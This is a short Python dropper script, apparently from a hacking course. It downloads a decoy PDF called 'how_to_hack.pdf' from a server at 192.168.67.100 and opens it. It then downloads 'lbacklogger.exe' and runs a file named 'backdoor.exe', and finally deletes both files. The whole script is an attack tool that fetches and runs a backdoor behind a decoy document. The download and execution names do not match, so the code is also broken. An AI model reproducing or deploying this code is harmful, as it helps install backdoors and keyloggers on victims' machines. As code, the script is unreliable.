#!usr/bin/env python
import requests
import os
import tempfile
import subprocess


def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)

# Method 1---Requires internet
temp_dir = tempfile.gettempdir()
os.chdir(temp_dir)

download("http://192.168.67.100/Software/how_to_hack.pdf")   #Through apache server
subprocess.Popen("how_to_hack.pdf", shell=True)

download("http://192.168.67.100/Software/lbacklogger.exe")
subprocess.call("backdoor.exe", shell=True)

os.remove("how_to_hack.pdf")
os.remove("backdoor.exe")